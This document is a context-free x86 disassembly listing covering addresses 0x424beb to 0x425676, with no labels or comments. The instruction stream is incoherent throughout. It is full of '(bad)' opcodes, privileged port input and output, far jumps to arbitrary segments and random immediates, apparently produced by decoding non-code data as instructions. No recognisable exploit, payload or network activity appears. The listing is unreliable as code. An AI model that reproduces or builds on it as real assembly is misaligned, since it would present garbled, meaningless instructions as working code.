  424beb:	pusha  
  424bec:	mov    edi,0xed0089cf
  424bf1:	pusha  
  424bf2:	dec    ecx
  424bf3:	xor    eax,0x1ddde601
  424bf8:	xchg   esi,eax
  424bf9:	sbb    ecx,esi
  424bfb:	ja     0x424bf6
  424bfd:	mov    bh,0x5b
  424bff:	loop   0x424c74
  424c01:	push   es
  424c02:	xor    ecx,eax
  424c04:	fs cmc 
  424c06:	inc    esi
  424c07:	dec    ebp
  424c08:	icebp  
  424c09:	enter  0x8665,0xe0
  424c0d:	sbb    al,0x2e
  424c0f:	or     edx,edi
  424c11:	int    0x32
  424c13:	xor    al,0x75
  424c15:	fstp   DWORD PTR [edx]
  424c17:	int    0x9f
  424c19:	jle    0x424c8f
  424c1b:	cmp    eax,0xc0f4f24
  424c20:	and    DWORD PTR [ebx],ecx
  424c22:	pop    edx
  424c23:	stos   BYTE PTR es:[edi],al
  424c24:	and    dh,BYTE PTR [edi]
  424c26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c27:	test   eax,0x5c30014c
  424c2c:	mov    ch,0xe1
  424c2e:	and    al,0x3
  424c30:	pop    esp
  424c31:	mov    WORD PTR ss:[eax-0x76],?
  424c35:	fiadd  WORD PTR ds:0xec28f062
  424c3b:	popf   
  424c3c:	mov    dl,0xa7
  424c3e:	imul   eax,edi,0x75d5885f
  424c44:	push   ebx
  424c45:	sub    eax,DWORD PTR [ecx+0x2ad43cea]
  424c4b:	jmp    0x80ada1c0
  424c50:	adc    bl,BYTE PTR [edx-0x1c]
  424c53:	fs in  eax,dx
  424c55:	and    edi,esp
  424c57:	mov    dl,0x7b
  424c59:	aas    
  424c5a:	xor    al,0x8c
  424c5c:	cmp    BYTE PTR [edi-0x58],bl
  424c5f:	in     eax,dx
  424c60:	push   esi
  424c61:	(bad)  
  424c62:	dec    ebp
  424c63:	jp     0x424c3c
  424c65:	mov    ds,WORD PTR [ecx]
  424c67:	mov    ds:0xdbfdf8be,eax
  424c6c:	fstp   TBYTE PTR [edi]
  424c6e:	outs   dx,BYTE PTR ds:[esi]
  424c6f:	dec    ecx
  424c70:	add    esi,edx
  424c72:	push   eax
  424c73:	cwde   
  424c74:	and    bh,al
  424c76:	cld    
  424c77:	aad    0xde
  424c79:	repz inc ebx
  424c7b:	popa   
  424c7c:	sub    dl,BYTE PTR [esi]
  424c7e:	inc    ecx
  424c7f:	sbb    al,0x8b
  424c81:	in     eax,dx
  424c82:	adc    edx,eax
  424c84:	xor    BYTE PTR [edx-0x11],ch
  424c87:	(bad)  
  424c88:	div    DWORD PTR [eax]
  424c8a:	mov    ds:0x53256f57,al
  424c8f:	rol    DWORD PTR [eax],0x0
	...
  424cf2:	add    BYTE PTR [eax],al
  424cf4:	ins    BYTE PTR es:[edi],dx
  424cf5:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424cfc:	bound  ebx,QWORD PTR [ebx-0x6253ae58]
  424d02:	test   eax,0x188ac4b
  424d07:	add    BYTE PTR [ecx+eax*1],al
  424d0a:	add    BYTE PTR [eax],al
  424d0c:	push   es
  424d0d:	and    BYTE PTR [esp+ebx*2-0x2d],cl
  424d11:	out    dx,al
  424d12:	retf   0x172d
  424d15:	out    0x58,eax
  424d17:	fst    QWORD PTR [ebx+0x665cabda]
  424d1d:	xor    al,bh
  424d1f:	mov    DWORD PTR [ecx-0x1f],edi
  424d22:	push   cs
  424d23:	mov    eax,0x93407e54
  424d28:	pop    ebx
  424d29:	xor    BYTE PTR [edx],al
  424d2b:	jle    0x424ccb
  424d2d:	cdq    
  424d2e:	cmp    al,0xe7
  424d30:	dec    cl
  424d32:	pop    ecx
  424d33:	pop    ebx
  424d34:	and    DWORD PTR [edx+esi*4+0x331b7f60],edx
  424d3b:	push   ebx
  424d3c:	sub    esp,DWORD PTR [ebp+0x14a570f7]
  424d42:	test   al,0x3a
  424d44:	mov    ebx,0xae98ebb8
  424d49:	loop   0x424d3a
  424d4b:	push   ds
  424d4c:	push   es
  424d4d:	fwait
  424d4e:	shr    al,cl
  424d50:	sbb    ch,BYTE PTR [edx]
  424d52:	xor    BYTE PTR [bp+si+0x5d5f],al
  424d57:	mov    ch,0xa1
  424d59:	xchg   ebx,eax
  424d5a:	pop    es
  424d5b:	daa    
  424d5c:	pusha  
  424d5d:	int    0x13
  424d5f:	mov    edi,0xaa73d8e7
  424d64:	cmp    DWORD PTR [esi],esp
  424d66:	in     eax,dx
  424d67:	and    BYTE PTR [esi-0x3e0590e9],cl
  424d6d:	sbb    dl,BYTE PTR [ecx+eiz*1+0xc]
  424d71:	fcmovnb st,st(0)
  424d73:	fidiv  WORD PTR [esp+edi*4+0x6af693cf]
  424d7a:	pushf  
  424d7b:	inc    eax
  424d7c:	mov    eax,ds:0xcacd3078
  424d81:	dec    edx
  424d82:	cmp    eax,0xfa297d14
  424d87:	mov    ds:0x52f1c90b,al
  424d8c:	xor    al,0xe4
  424d8e:	js     0x424d73
  424d90:	bound  ebp,QWORD PTR cs:[edx]
  424d93:	ins    BYTE PTR es:[edi],dx
  424d94:	frstor [eax+0x4]
  424d97:	cmp    ch,BYTE PTR [edx]
  424d99:	imul   esi,ecx,0xecf2b882
  424d9f:	and    al,0xe1
  424da1:	ja     0x424d7f
  424da3:	mov    dh,BYTE PTR [eax+0x56]
  424da6:	stos   DWORD PTR es:[edi],eax
  424da7:	add    al,0x72
  424da9:	pop    esi
  424daa:	xchg   edi,eax
  424dab:	or     dh,ah
  424dad:	mov    esp,0x4eb92f9b
  424db2:	inc    edi
  424db3:	mov    edi,0x11a3cb0e
  424db8:	mov    fs,WORD PTR [eax]
  424dba:	jne    0x424dd4
  424dbc:	fcom   st(4)
  424dbe:	mov    ah,0xd9
  424dc0:	sub    DWORD PTR [edx+0x7d3cee52],ecx
  424dc6:	or     eax,0x70997247
  424dcb:	and    dh,dh
  424dcd:	sar    DWORD PTR [ebp+0xd],0xcc
  424dd1:	in     eax,0x54
  424dd3:	test   al,0x5d
  424dd5:	(bad)  
  424dd6:	xor    dh,ah
  424dd8:	dec    esp
  424dd9:	mov    al,ds:0xff187552
  424dde:	sahf   
  424ddf:	sbb    dl,0xf
  424de2:	ins    DWORD PTR es:[edi],dx
  424de3:	mov    ds:0x80e9ce84,eax
  424de8:	hlt    
  424de9:	shl    DWORD PTR gs:[eax-0x5d9b57da],1
  424df0:	int    0x0
  424df2:	add    ecx,edi
  424df4:	jmp    0x2e7b9ee2
  424df9:	jbe    0x424e74
  424dfb:	push   ebp
  424dfc:	push   esi
  424dfd:	cmp    DWORD PTR [eax],edx
  424dff:	shl    BYTE PTR [edi+esi*8-0x12532ab],0xd0
  424e07:	mov    cs,WORD PTR [ebp+0x61048d34]
  424e0d:	push   ebp
  424e0e:	(bad)  
  424e0f:	test   BYTE PTR [eax],0x0
	...
  424e72:	add    BYTE PTR [eax],al
  424e74:	cmp    eax,0xf361d20c
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424ec9
  424e81:	sub    DWORD PTR [ecx-0x45],esp
  424e84:	mov    al,0x89
  424e86:	add    DWORD PTR [eax],eax
  424e88:	add    al,0x1
  424e8a:	add    BYTE PTR [eax],al
  424e8c:	and    DWORD PTR [ebp-0x1c],ebx
  424e8f:	pop    ss
  424e90:	mov    dl,0xbb
  424e92:	ja     0x424e66
  424e94:	adc    bl,BYTE PTR [ebx]
  424e96:	fcom   DWORD PTR ds:0x111d479
  424e9c:	xchg   DWORD PTR [edx+ebp*4-0x57],eax
  424ea0:	sbb    BYTE PTR [ecx],0x65
  424ea3:	test   DWORD PTR [esi],0xe57ca91a
  424ea9:	shr    DWORD PTR [eax+ecx*1],cl
  424eac:	inc    esi
  424ead:	out    dx,eax
  424eae:	ret    
  424eaf:	prefetch BYTE PTR [edx+0x15ca26f6]
  424eb6:	xor    bh,BYTE PTR [ebx+edi*4-0x24e00958]
  424ebd:	in     al,0x39
  424ebf:	shr    DWORD PTR [ecx],1
  424ec1:	gs push ss
  424ec3:	cli    
  424ec4:	pop    edi
  424ec5:	hlt    
  424ec6:	xchg   edx,eax
  424ec7:	mov    ds:0xa1072d0f,eax
  424ecc:	call   0xce45:0x204ce08b
  424ed3:	inc    edx
  424ed4:	jns    0x424f22
  424ed6:	inc    edi
  424ed7:	xor    DWORD PTR [ecx-0x4],edi
  424eda:	xor    DWORD PTR [ebp-0x50db2397],esi
  424ee0:	cmc    
  424ee1:	mov    WORD PTR [eax+0x44],?
  424ee4:	mov    al,0xa
  424ee6:	pushf  
  424ee7:	or     bl,dh
  424ee9:	adc    DWORD PTR [ebp+eiz*1+0x3c],ebp
  424eed:	loope  0x424ef6
  424eef:	mov    fs,WORD PTR [ecx+0x27d59e24]
  424ef5:	frstor [edx-0x1b]
  424ef8:	in     eax,0xc9
  424efa:	mov    al,dl
  424efc:	mov    ch,0x9a
  424efe:	dec    ecx
  424eff:	mov    ecx,?
  424f01:	stc    
  424f02:	in     al,0x67
  424f04:	jmp    0xbcc5:0x2d36371a
  424f0b:	lea    edx,[edi+0x6c]
  424f0e:	pusha  
  424f0f:	jae    0x424edf
  424f11:	retf   0xe106
  424f14:	cmp    ebp,DWORD PTR [eax+0x331e71c0]
  424f1a:	fucomi st,st(6)
  424f1c:	jbe    0x424f38
  424f1e:	xchg   BYTE PTR [esi],ch
  424f20:	or     al,0x5a
  424f22:	mov    eax,ds:0xdb123632
  424f27:	outs   dx,DWORD PTR ds:[esi]
  424f28:	fisub  DWORD PTR [ecx]
  424f2a:	xor    eax,0xb5532d85
  424f2f:	das    
  424f30:	icebp  
  424f31:	ret    0x707f
  424f34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f35:	addr16 out dx,al
  424f37:	inc    edx
  424f38:	test   eax,0xc0b23727
  424f3d:	(bad)  
  424f3e:	call   0x337a:0x4a906645
  424f45:	(bad)  
  424f46:	adc    al,0xc0
  424f48:	cwde   
  424f49:	les    eax,FWORD PTR [edx]
  424f4b:	test   DWORD PTR [ebx],eax
  424f4d:	daa    
  424f4e:	je     0x424f56
  424f50:	(bad)  
  424f51:	sub    dl,BYTE PTR [ecx+ecx*8]
  424f54:	dec    edx
  424f55:	inc    edx
  424f56:	dec    edi
  424f57:	fstp   TBYTE PTR [eax+0x63444d05]
  424f5d:	mov    bl,0x10
  424f5f:	push   edx
  424f60:	adc    ebx,DWORD PTR [ebx]
  424f62:	shl    ebx,1
  424f64:	loope  0x424f93
  424f66:	or     ebx,DWORD PTR [ebx+0x5b6789e2]
  424f6c:	push   ebx
  424f6d:	mov    fs,WORD PTR [edi-0x74446f56]
  424f73:	repz out 0xec,eax
  424f76:	cwde   
  424f77:	repz out dx,al
  424f79:	cmp    ebp,ecx
  424f7b:	cmp    BYTE PTR [esi-0x1a],bh
  424f7e:	aaa    
  424f7f:	jbe    0x424fcc
  424f81:	push   edi
  424f83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f84:	or     al,cl
  424f86:	jecxz  0x424f69
  424f88:	(bad)  
  424f89:	mov    edi,0x4f24b525
  424f8e:	or     BYTE PTR [ecx+0x0],dl
	...
  424ff1:	add    BYTE PTR [eax],al
  424ff3:	add    BYTE PTR [ebx+0x16],cl
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	fwait
  425001:	cmp    eax,0x8ab46787
  425006:	add    DWORD PTR [eax],eax
  425008:	add    al,0x1
  42500a:	add    BYTE PTR [eax],al
  42500c:	ins    DWORD PTR es:[edi],dx
  42500d:	call   FWORD PTR [ebx]
  42500f:	or     ebx,esp
  425011:	pop    eax
  425012:	sub    al,0x59
  425014:	dec    edx
  425015:	ds mov esp,esp
  425018:	inc    ebx
  425019:	loopne 0x424fef
  42501b:	sbb    DWORD PTR [edi-0x646aadc8],esi
  425021:	arpl   bp,dx
  425023:	loop   0x425096
  425025:	push   edx
  425026:	fwait
  425027:	adc    al,0x67
  425029:	std    
  42502a:	shr    BYTE PTR [edi-0x722f3edd],0xd5
  425031:	ja     0x424feb
  425033:	fsubr  DWORD PTR [edi+0x589fa6b]
  425039:	cwde   
  42503a:	mov    ah,ch
  42503c:	in     al,0x16
  42503e:	test   BYTE PTR [ebx+0x1f],ch
  425041:	(bad)  
  425042:	dec    eax
  425043:	inc    ebx
  425044:	adc    ecx,esi
  425046:	and    eax,0x468616d9
  42504b:	and    esp,DWORD PTR [edi-0x5c]
  42504e:	sbb    BYTE PTR [eax],0xc3
  425051:	push   eax
  425052:	dec    ebp
  425053:	lock sbb edi,edx
  425056:	(bad)  
  425057:	push   es
  425058:	hlt    
  425059:	and    al,0x94
  42505b:	push   edi
  42505c:	lods   eax,DWORD PTR ds:[esi]
  42505d:	adc    eax,0xd9d6c203
  425062:	and    BYTE PTR [ebp-0x44],0x57
  425066:	adc    al,0xb1
  425068:	jecxz  0x424ffc
  42506a:	stos   BYTE PTR es:[edi],al
  42506b:	xchg   edx,eax
  42506c:	adc    al,0xf8
  42506e:	xchg   ebp,eax
  42506f:	xor    cl,BYTE PTR [ebp+edx*2+0x4c]
  425073:	dec    ebp
  425074:	cmc    
  425075:	lods   al,BYTE PTR ds:[esi]
  425076:	data16 loop 0x4250f2
  425079:	retf   0x80e0
  42507c:	cmp    al,0x39
  42507e:	je     0x4250ef
  425080:	push   edx
  425081:	clc    
  425082:	pop    ebx
  425083:	inc    esi
  425084:	sub    eax,0x62ac0757
  425089:	gs or  al,0xf2
  42508c:	sar    eax,1
  42508e:	jbe    0x4250a3
  425090:	fcomp  DWORD PTR [edx-0x24]
  425093:	(bad)  
  425095:	and    ebx,edi
  425097:	cmp    DWORD PTR [ecx-0x6f],0x81dbebe1
  42509e:	xor    al,0xdb
  4250a0:	addr16 jnp 0x4250f8
  4250a3:	fidiv  DWORD PTR [eax+esi*1]
  4250a6:	mov    edx,0x96a5af4d
  4250ab:	(bad)  
  4250ac:	jnp    0x425101
  4250ae:	jb     0x8a22200d
  4250b4:	(bad)  [ebx-0xe]
  4250b7:	fdiv   DWORD PTR [esi-0x2e]
  4250ba:	jge    0x425118
  4250bc:	jno    0x4250c1
  4250be:	fisubr WORD PTR [esi]
  4250c0:	mov    cl,BYTE PTR [ebx-0x7cd31ae3]
  4250c6:	daa    
  4250c7:	aaa    
  4250c8:	sub    DWORD PTR [edi+0x66258782],edx
  4250ce:	mov    edi,cs
  4250d0:	dec    edi
  4250d1:	jl     0x4250f6
  4250d3:	or     edx,DWORD PTR [eax]
  4250d5:	repz sbb eax,0x17ab6c46
  4250db:	xchg   esi,eax
  4250dc:	xchg   esi,eax
  4250dd:	jle    0x425131
  4250df:	aad    0xb
  4250e1:	dec    ebx
  4250e2:	xchg   edx,eax
  4250e3:	pop    ebx
  4250e4:	pop    edi
  4250e5:	dec    esi
  4250e6:	adc    al,dl
  4250e8:	adc    esi,DWORD PTR [eax+0x76d5b2bb]
  4250ee:	mov    dl,0x8c
  4250f0:	mov    WORD PTR [esi+0x40],fs
  4250f3:	int3   
  4250f4:	add    al,0x67
  4250f6:	and    BYTE PTR [eax+ecx*4],dh
  4250f9:	test   eax,0xb4d99b7f
  4250fe:	adc    al,0x39
  425100:	or     BYTE PTR [ebx-0x2d22fd56],0x53
  425107:	arpl   di,bx
  425109:	lods   eax,DWORD PTR ds:[esi]
  42510a:	adc    eax,0xbbc38532
  42510f:	mov    ecx,0x0
	...
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0xe59e:0xa59c92e8
  425184:	mov    eax,0x400018b
  425189:	add    DWORD PTR [eax],eax
  42518b:	add    cl,bl
  42518d:	in     eax,dx
  42518e:	adc    ecx,DWORD PTR [ecx]
  425190:	int    0xf9
  425192:	in     al,0x5b
  425194:	gs pop ds
  425196:	cmp    DWORD PTR [eax-0x15],ebp
  425199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42519a:	push   ebp
  42519b:	and    BYTE PTR [ebp+0x5e],bl
  42519e:	dec    edx
  42519f:	ret    
  4251a0:	dec    ebp
  4251a1:	int3   
  4251a2:	jle    0x425203
  4251a4:	rcl    al,1
  4251a6:	das    
  4251a7:	stc    
  4251a8:	pop    ds
  4251a9:	mov    DWORD PTR [ebx-0x47],0x6e8f9def
  4251b0:	pop    esp
  4251b1:	jo     0x425170
  4251b3:	cwde   
  4251b4:	imul   edx,DWORD PTR [eax-0x7220c584],0x3e
  4251bb:	fldcw  WORD PTR ss:[eax]
  4251be:	xchg   edx,eax
  4251bf:	lahf   
  4251c0:	dec    esi
  4251c1:	xchg   ecx,eax
  4251c2:	jl     0x4251c3
  4251c4:	inc    esi
  4251c5:	fisttp DWORD PTR [edx]
  4251c7:	cmp    eax,0x7c895f8c
  4251cc:	js     0x4251fe
  4251ce:	pop    eax
  4251cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251d0:	iret   
  4251d1:	rcl    bl,0x71
  4251d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4251d5:	xor    cl,ah
  4251d7:	test   cl,al
  4251d9:	push   ecx
  4251da:	sub    BYTE PTR [edx-0x3f],0x20
  4251de:	pop    ebp
  4251df:	out    dx,eax
  4251e0:	xchg   BYTE PTR [edx-0x80],ch
  4251e3:	loopne 0x42521c
  4251e5:	in     al,0x7e
  4251e7:	fwait
  4251e8:	int3   
  4251e9:	dec    edx
  4251ea:	jge    0x4251f7
  4251ec:	mov    eax,ds:0xc0140b46
  4251f1:	lea    esi,[eax+0x5a]
  4251f4:	pop    ds
  4251f5:	push   ebx
  4251f6:	lahf   
  4251f7:	scas   al,BYTE PTR es:[edi]
  4251f8:	sub    BYTE PTR [eax-0x41f7325d],ah
  4251fe:	addr16 call 0x2eedcc82
  425204:	xchg   esi,eax
  425205:	cmp    BYTE PTR [ebx],dl
  425207:	clc    
  425208:	sbb    ecx,DWORD PTR [ebp+0x3bb2010d]
  42520e:	xor    ebp,DWORD PTR [esi+0x2e]
  425211:	push   edx
  425212:	retf   0xd32e
  425215:	mov    edi,0x1fecc94d
  42521a:	xor    BYTE PTR [ebp+0x4c8eef1a],0xfd
  425221:	xlat   BYTE PTR ds:[ebx]
  425222:	test   eax,0x47ec599f
  425227:	mov    dh,0x6b
  425229:	sbb    eax,0xc201aab5
  42522e:	jne    0x425272
  425230:	xchg   ebp,eax
  425231:	sbb    edi,DWORD PTR [esi]
  425233:	jb     0x4251f2
  425235:	cwde   
  425236:	and    eax,0xab42eaa9
  42523b:	shr    BYTE PTR [esi+0x3],cl
  42523e:	inc    esp
  42523f:	shr    DWORD PTR [ecx+0x56],0xd1
  425243:	push   edx
  425244:	or     BYTE PTR [edx+0x6d],ch
  425247:	mov    ecx,0x2063b9d6
  42524c:	push   ss
  42524d:	mov    ebp,DWORD PTR [edx+0xd]
  425250:	fisttp WORD PTR [edx+eax*2+0x66]
  425254:	sbb    eax,0x97748ded
  425259:	xchg   BYTE PTR [edx+0x4],bh
  42525c:	popf   
  42525d:	pop    ds
  42525e:	retf   
  42525f:	call   0x5b62:0x3a2aadd
  425266:	cmp    edi,DWORD PTR [ebx]
  425268:	sub    BYTE PTR [edx-0x7dab2dc5],ah
  42526e:	rcl    DWORD PTR [esi],0x95
  425271:	adc    DWORD PTR [edi],esi
  425273:	test   eax,0xb2aef68e
  425278:	mov    dl,0xae
  42527a:	mov    cl,0xf
  42527c:	repz inc eax
  42527e:	arpl   WORD PTR [esi-0x66298cf1],si
  425284:	inc    ebp
  425285:	int3   
  425286:	retf   0xc1cc
  425289:	ds add al,0x3c
  42528c:	jl     0x42528a
  42528e:	cld    
  42528f:	pop    es
	...
  4252f4:	lods   al,BYTE PTR ds:[esi]
  4252f5:	les    esi,FWORD PTR [ebx-0x32]
  4252f8:	jnp    0x4252f9
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	mov    eax,ds:0xbc388b87
  425305:	mov    WORD PTR [ecx],es
  425307:	add    BYTE PTR [ecx+eax*1],al
  42530a:	add    BYTE PTR [eax],al
  42530c:	ret    
  42530d:	lock mov BYTE PTR [esi+0x4d],ah
  425311:	and    DWORD PTR [ebx+0x60fee2a6],edi
  425317:	pop    esi
  425318:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425319:	pop    es
  42531a:	push   edx
  42531b:	popf   
  42531c:	pause  
  42531e:	xor    al,BYTE PTR [ebp+0x61]
  425321:	ja     0x42533a
  425323:	fld    DWORD PTR [edi-0x4e]
  425326:	cmp    BYTE PTR [edi],cl
  425328:	call   0x236b:0xbb4b22a5
  42532f:	cmp    eax,0x9438b963
  425334:	inc    eax
  425335:	cmp    ebp,DWORD PTR ds:0xd06a7ba2
  42533b:	jno    0x425328
  42533d:	(bad)  [ecx+0x7]
  425340:	lock aas 
  425342:	(bad)  
  425343:	lea    esp,[edx+0x37b5cc5]
  425349:	addr16 nop
  42534b:	shr    BYTE PTR [edi-0x5],cl
  42534e:	sti    
  42534f:	pop    es
  425350:	mov    esi,0x3246e2a9
  425355:	xor    al,ah
  425357:	sub    cl,BYTE PTR [ecx]
  425359:	adc    eax,0xc2970351
  42535e:	mov    ebp,0x7b18bdb
  425363:	rcr    DWORD PTR [ecx+0x3454f108],cl
  425369:	cwde   
  42536a:	add    DWORD PTR ds:0xa2a6c5e1,0xdebe8e37
  425374:	sbb    al,0x50
  425376:	arpl   WORD PTR [ebp+0x1ad50850],cx
  42537c:	xor    eax,0x46197956
  425381:	pusha  
  425382:	ja     0x425318
  425384:	out    0x76,al
  425386:	mov    eax,0x9d8f0b6f
  42538b:	in     al,0xd1
  42538d:	jp     0x425355
  42538f:	ret    
  425390:	jp     0x425337
  425392:	push   ebp
  425393:	gs sub ebp,0xffffffd0
  425397:	(bad)  
  425398:	xchg   esi,eax
  425399:	clc    
  42539a:	loop   0x425413
  42539c:	mul    ebx
  42539e:	dec    eax
  42539f:	aaa    
  4253a0:	inc    eax
  4253a1:	sub    al,BYTE PTR [ecx]
  4253a3:	cmp    eax,esp
  4253a5:	or     eax,0x1b61961e
  4253aa:	add    eax,DWORD PTR [ecx]
  4253ac:	pop    es
  4253ad:	xor    edi,DWORD PTR [edi]
  4253af:	std    
  4253b0:	and    eax,0x1b75563a
  4253b5:	call   0xd4b9:0x2c900aed
  4253bc:	inc    edx
  4253bd:	push   ss
  4253be:	jp     0x425431
  4253c0:	call   0x1580:0x9de45255
  4253c7:	push   ebp
  4253c8:	mov    dl,0x82
  4253ca:	(bad)  
  4253cc:	mov    ch,0x32
  4253ce:	retf   0xe3f8
  4253d1:	mov    ds:0x46bff824,eax
  4253d6:	jge    0x4253e7
  4253d8:	pop    ebx
  4253d9:	jmp    0x27e8794d
  4253de:	inc    eax
  4253df:	repz leavew 
  4253e2:	or     DWORD PTR [ebx-0x4a],edi
  4253e5:	in     eax,0xb
  4253e7:	push   ebp
  4253e8:	pop    esi
  4253e9:	adc    al,BYTE PTR ds:0xb51c48fe
  4253ef:	shrd   edx,edx,0x97
  4253f3:	fs es jo 0x425385
  4253f7:	mov    eax,ds:0x9ce9a6b6
  4253fc:	xchg   esp,eax
  4253fd:	pop    edi
  4253fe:	jp     0x425476
  425400:	pop    ebp
  425401:	and    DWORD PTR [edx-0x3b],esp
  425404:	pusha  
  425405:	inc    ebx
  425406:	lock test BYTE PTR [eax-0x26],bl
  42540a:	dec    ecx
  42540b:	sub    BYTE PTR [ebx+0x22],bh
  42540e:	xchg   edi,eax
  42540f:	mov    ds:0x0,eax
	...
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    esp,DWORD PTR [ebp-0x3f78db13]
  425485:	lea    eax,[ecx]
  425487:	add    BYTE PTR [ecx+eax*1],al
  42548a:	add    BYTE PTR [eax],al
  42548c:	pop    edx
  42548d:	mov    esp,0xd65bacac
  425492:	xchg   DWORD PTR [eax+0x4a71027f],ebp
  425498:	sub    bl,bl
  42549a:	mov    edx,0x4ab2b763
  42549f:	push   es
  4254a0:	shl    esp,1
  4254a2:	jmp    0x69ba:0x4a36b318
  4254a9:	shr    dh,1
  4254ab:	sbb    al,0xfe
  4254ad:	cmc    
  4254ae:	test   BYTE PTR [ecx-0x5053d460],bl
  4254b4:	mov    cl,0x25
  4254b6:	xchg   esi,eax
  4254b7:	cmp    DWORD PTR [ebx+ecx*8+0x1c],ebx
  4254bb:	pop    ebx
  4254bc:	mov    al,0x5f
  4254be:	xlat   BYTE PTR ds:[ebx]
  4254bf:	loop   0x425520
  4254c1:	es loopne 0x425480
  4254c4:	push   ss
  4254c5:	outs   dx,DWORD PTR ds:[esi]
  4254c6:	in     eax,dx
  4254c7:	(bad)  [bx+di+0x4b]
  4254cb:	sti    
  4254cc:	mov    bl,0x24
  4254ce:	jnp    0x425453
  4254d0:	inc    ebx
  4254d1:	pop    ss
  4254d2:	lods   al,BYTE PTR ds:[esi]
  4254d3:	adc    al,0x15
  4254d5:	inc    ebx
  4254d6:	xchg   edx,eax
  4254d7:	(bad)  
  4254d8:	xchg   esi,eax
  4254d9:	sub    BYTE PTR [ebx],dh
  4254db:	loop   0x425546
  4254dd:	rcr    ecx,cl
  4254df:	jmp    0x3e4f:0xa58f7335
  4254e6:	mov    esi,DWORD PTR [edx]
  4254e8:	pop    eax
  4254e9:	out    dx,eax
  4254ea:	pop    ebx
  4254eb:	push   ss
  4254ec:	xchg   ebx,eax
  4254ed:	xor    eax,0xd908fd66
  4254f2:	mov    ebp,0xc8395c2d
  4254f7:	push   0x52ec5a12
  4254fc:	nop
  4254fd:	bound  ebx,QWORD PTR [ebx+esi*8-0x7515d7a6]
  425504:	pop    eax
  425505:	push   esp
  425506:	popa   
  425507:	dec    edx
  425508:	xchg   ebx,eax
  425509:	inc    esp
  42550a:	cmp    ch,BYTE PTR [esi-0xe]
  42550d:	dec    esp
  42550e:	out    0x51,eax
  425510:	(bad)  
  425511:	(bad)  
  425512:	fimul  DWORD PTR gs:[ebp-0x2ab1b032]
  425519:	pop    ss
  42551a:	sub    ecx,0xfffffff6
  42551d:	adc    DWORD PTR [ebx-0xa2bd461],eax
  425523:	mov    esp,0xe2e8e24b
  425528:	je     0x425529
  42552a:	out    dx,al
  42552b:	or     edx,esi
  42552d:	stos   BYTE PTR es:[edi],al
  42552e:	jl     0x4254b8
  425530:	mov    dh,0x79
  425532:	sub    eax,DWORD PTR [ebx+0x20]
  425535:	icebp  
  425536:	(bad)  [eax+0x19]
  425539:	jg     0x4255b0
  42553b:	(bad)  
  42553c:	out    0x81,al
  42553e:	loope  0x42555e
  425540:	dec    edi
  425541:	int    0x16
  425543:	mov    al,ds:0xe5110ed7
  425548:	push   0xf3f09ad
  42554d:	aaa    
  42554e:	push   esp
  42554f:	hlt    
  425550:	push   cs
  425551:	arpl   WORD PTR [esi-0x67a90dcb],bx
  425557:	mov    bh,0xe8
  425559:	repz sub dh,BYTE PTR [ebp+edx*1+0x356e5fd1]
  425561:	fadd   QWORD PTR [eax-0x64e0985f]
  425567:	adc    al,BYTE PTR [ebx-0x67]
  42556a:	jle    0x42559c
  42556c:	jge    0x4255c0
  42556e:	stos   DWORD PTR es:[edi],eax
  42556f:	jne    0x42558c
  425571:	jl     0x425553
  425573:	mov    ebp,0x86ad347b
  425578:	pushf  
  425579:	pop    ecx
  42557a:	in     eax,0x7f
  42557c:	loopne 0x425527
  42557e:	pushf  
  42557f:	into   
  425580:	stos   DWORD PTR es:[edi],eax
  425581:	or     DWORD PTR [esi],ebx
  425583:	loop   0x425567
  425585:	imul   eax,DWORD PTR [esp+ebp*2],0xf2542215
  42558c:	jle    0x425531
  42558e:	mov    bl,0xc3
	...
  4255f4:	(bad)  
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0xcc3af13a
  425602:	mov    al,0x21
  425604:	les    ecx,FWORD PTR [esi+0x1040001]
  42560a:	add    BYTE PTR [eax],al
  42560c:	sbb    BYTE PTR [edx+0x2ce810bd],al
  425612:	(bad)  
  425614:	and    DWORD PTR [ecx],edx
  425616:	aaa    
  425617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425618:	std    
  425619:	fwait
  42561a:	call   0x3b666bb1
  42561f:	or     al,0xa8
  425621:	pop    ecx
  425622:	(bad)  
  425623:	addr16 retf 
  425625:	retf   
  425626:	cmc    
  425627:	pop    ds
  425628:	sbb    eax,0x24be6126
  42562d:	rol    dh,cl
  42562f:	and    BYTE PTR [eax+0x1382ebc9],cl
  425635:	pop    eax
  425636:	test   DWORD PTR [edx],ecx
  425638:	push   esi
  425639:	and    BYTE PTR [edx-0x73b7c66],ah
  42563f:	sahf   
  425640:	imul   ecx,ebx,0xffffff9d
  425643:	loopne 0x425660
  425645:	imul   esp,ecx,0xffffffbf
  425648:	fld    QWORD PTR [esi+eax*8-0x2aa26804]
  42564f:	or     eax,DWORD PTR [ecx]
  425651:	mov    edi,0xfdd0a937
  425656:	sbb    al,0xd
  425658:	push   edx
  425659:	retf   
  42565a:	popa   
  42565b:	pcmpeqw mm5,QWORD PTR [esi+edx*8+0x4057f11e]
  425663:	adc    ah,BYTE PTR [ebx]
  425665:	sahf   
  425666:	ds cdq 
  425668:	sahf   
  425669:	mov    eax,ds:0xb704fb0d
  42566e:	push   ebx
  42566f:	cli    
  425670:	imul   ecx,DWORD PTR [edi],0xa8d22630
  425676:	in     al,dx
